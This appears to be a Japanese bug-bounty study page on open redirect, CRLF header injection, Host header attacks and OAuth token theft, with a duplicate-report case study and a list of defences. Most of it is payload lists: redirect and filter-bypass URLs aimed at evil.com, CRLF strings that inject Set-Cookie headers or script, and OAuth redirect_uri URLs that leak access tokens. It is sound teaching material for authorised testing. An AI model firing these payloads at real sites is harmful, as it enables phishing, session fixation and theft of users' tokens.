Open Redirect & Header Injection

リダイレクト先やHTTPヘッダーを操作し、フィッシング・トークン窃取・キャッシュポイズニングを実現する。 単体では Low 評価だが、OAuth チェーンで Critical に昇格可能。

Theory WSA Lab Hands-on Case Study

原理と仕組み

Open Redirect は、アプリケーションがユーザー入力をリダイレクト先として使用する際に、 外部ドメインへのリダイレクトを許可してしまう脆弱性。 CRLF / Header Injection は、HTTPレスポンスヘッダーにユーザー入力を注入する。

BB における評価

Open Redirect 単体は多くのプログラムで Low / Informational / Out of Scope。 しかし以下のチェーンで severity が大幅に上がる:

  • OAuth redirect_uri hijack → Access Token 窃取 (Critical)
  • SSO フローでの token leakage
  • SSRF フィルタのバイパス
  • Referer 経由でのトークン漏洩

種類と分類

1. Open Redirect テクニック

// 基本形
https://target.com/redirect?url=https://evil.com

// プロトコル相対URL
//evil.com
\/\/evil.com
/\/evil.com

// バックスラッシュ
https://target.com/redirect?url=https://evil.com\@target.com
https://target.com/redirect?url=//evil.com\

// URL エンコーディング
%2f%2fevil.com
%252f%252fevil.com  // double encode

// @ トリック (Basic Auth 構文)
https://target.com@evil.com
https://target.com%40evil.com

// ドメインの一部一致バイパス
// フィルタ: url must contain "target.com"
https://target.com.evil.com
https://evil.com/target.com
https://evil.com?target.com

// null byte / fragment
https://evil.com%00.target.com
https://target.com#@evil.com

// data URI
data:text/html,<script>location='https://evil.com'</script>

// JavaScript URI (一部環境)
javascript:location='https://evil.com'

2. CRLF Injection (Header Injection)

HTTP レスポンスヘッダーに CR LF (%0d%0a) を注入し、 新しいヘッダーや body を追加する。 

// 基本
GET /page?lang=en%0d%0aInjected-Header:%20value HTTP/1.1

// レスポンス:
HTTP/1.1 302 Found
Location: /page?lang=en
Injected-Header: value

// XSS への昇格 (body 注入)
GET /page?param=value%0d%0a%0d%0a<script>alert(1)</script>

// Set-Cookie 注入 (セッション固定)
GET /page?param=x%0d%0aSet-Cookie:%20session=attacker_session

// エンコーディングバリエーション
%0d%0a        // CRLF
%0a           // LF only (一部サーバーで有効)
%E5%98%8A%E5%98%8D  // UTF-8 encoded CRLF (Unicode normalization)

3. Host Header Attacks

// Password Reset Poisoning
POST /forgot-password HTTP/1.1
Host: evil.com

// リセットメールのリンク: https://evil.com/reset?token=abc123
// 被害者がクリック → トークンが攻撃者に送信

// X-Forwarded-Host
POST /forgot-password HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com

// Web Cache Poisoning
GET /static/main.js HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com

// キャッシュキーに Host が含まれない場合:
// CDN が evil.com のコンテンツをキャッシュ → 他ユーザーに配信

// Routing-based SSRF
GET /internal-api HTTP/1.1
Host: internal.target.com
// ロードバランサーが Host ヘッダーでルーティング先を決定

4. OAuth Token Theft via Open Redirect

// OAuth フロー:
// 1. ユーザーが認可サーバーにアクセス
// 2. 認可後、redirect_uri にトークンが付いてリダイレクト

// 攻撃:
// redirect_uri の検証が不十分な場合:
https://auth.target.com/authorize?
  client_id=app&
  redirect_uri=https://target.com/callback/../redirect?url=https://evil.com&
  response_type=token

// トークンが evil.com に送信される:
// https://evil.com#access_token=leaked_token

// redirect_uri バイパスパターン:
redirect_uri=https://target.com.evil.com
redirect_uri=https://target.com%40evil.com
redirect_uri=https://target.com/callback/../../other-page
redirect_uri=https://target.com/callback?next=https://evil.com

検出方法

テスト対象方法
リダイレクトパラメータurl=, next=, redirect=, return=, continue= を探す
302/301 レスポンスLocation ヘッダーにユーザー入力が反映されるか
JavaScript リダイレクトwindow.location, document.location への入力反映
Meta refreshmeta タグの URL にユーザー入力が含まれるか
CRLFパラメータに %0d%0a を注入してヘッダー確認
Host HeaderX-Forwarded-Host でレスポンス変化確認

実体験: OPPO Open Redirect (dup)

drp.myoppo.com - Open Redirect via state parameter

OPPOのデバイスリカバリポータルで、OAuth の state パラメータに リダイレクト先 URL がエンコードされており、攻撃者が任意の外部 URL を指定可能だった。

結果: Duplicate (既に報告済み)。Open redirect 単体としての報告だが、 OAuth トークンの leakage と組み合わせればより高い severity を主張できた可能性がある。

教訓: Open redirect を見つけたら、単体で報告せず OAuth/SSO チェーンを先に探索する。

防御と Bypass

防御策

  • ホワイトリスト方式: 許可するドメインを明示的に列挙
  • 相対パスのみ許可: 外部 URL を完全に禁止
  • リダイレクトマップ: URL ではなく ID で管理 (redirect_id=3)
  • ユーザー確認画面: 「外部サイトに移動します」の警告表示

フィルタ Bypass パターン集

// ドメインホワイトリスト bypass
// 検証: url.startswith("https://target.com")
https://target.com.evil.com
https://target.com@evil.com
https://target.com%23@evil.com

// 検証: url.endswith("target.com")
https://evil-target.com
https://eviltarget.com

// 検証: "target.com" in url
https://evil.com/target.com
https://evil.com?q=target.com

// プロトコル検証 bypass
// 検証: url.startswith("http")
http://evil.com
https://evil.com

// Path 検証 bypass
// 検証: url starts with /
/\/evil.com
/\evil.com
/%09/evil.com

Key Takeaways

  • Open Redirect 単体は Low: チェーン価値を常に探す (OAuth, SSRF bypass)
  • OAuth redirect_uri が最大の prize: Access token 窃取で Critical に
  • Host Header は多目的: Password reset, Cache poison, SSRF に使える
  • CRLF は過去の遺物ではない: 特にレガシーシステムやプロキシ経由で健在
  • bypass テクニックを系統的に試す: encoding, backslash, @, fragment を全網羅
